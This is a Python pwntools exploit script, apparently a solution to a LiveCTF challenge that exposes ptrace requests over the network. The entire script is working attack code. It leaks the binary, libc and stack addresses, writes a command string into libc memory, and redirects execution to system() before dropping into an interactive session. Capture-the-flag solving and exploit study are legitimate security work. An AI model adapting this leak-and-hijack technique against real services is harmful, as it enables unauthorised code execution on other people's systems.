#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process('./challenge')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def s3(x1,x2,x3, more=True):
    if more:
        io.sendlineafter(b'Do another (0/1)?\n', b'1')
    io.sendlineafter(b'What ptrace request do you want to send?\n', hex(x1)[2:].encode())
    io.sendlineafter(b'What address do you want?\n', hex(x2)[2:].encode())
    io.sendlineafter(b'What do you want copied into data?\n', hex(x3)[2:].encode())
    io.recvuntil(b'ptrace returned ')
    r = io.recvline(keepends=False)
    return int(r, 16)


s3(3, 0, 0, False) # setup


libc_bss_offset = 0x21A8A0

bin_base = s3(3, 8, 0) - 0x3d68
info('bin_base: 0x%x' % bin_base)

leak = s3(2, bin_base + 0x3F80, 0)
info('leak: 0x%x' % leak)

libc_base = leak - 0x80ed0
info('libc_base: 0x%x' % libc_base)

system = libc_base + 	0x50d60

rsp_leak = s3(3, 19*8, 0)
info('rsp_leak: 0x%x' % rsp_leak)

ra = rsp_leak + 0x180
info('RA at: 0x%x' % ra)

def w(addr, val):
    info(hex(s3(4, addr, val)))

def ws(addr, s):
    s = s.encode() + b'\x00'
    while len(s) % 8 != 0:
        s += b'\x00'
    for i in range(0, len(s), 8):
        cur = u64(s[i:i+8])
        w(addr + i, cur)

#command = 'echo haha > /tmp/wtf'
command = '/home/livectf/submitter'
ws(libc_base + libc_bss_offset, command)

info(hex(s3(6, 16*8, system)))
info(hex(s3(6, 14*8, libc_base + libc_bss_offset)))

for i in range(32):
    info(str(i) + '|' + hex(s3(2, libc_base + libc_bss_offset + 8*i, 0)))

io.sendlineafter(b'Do another (0/1)?\n', b'0')
io.interactive()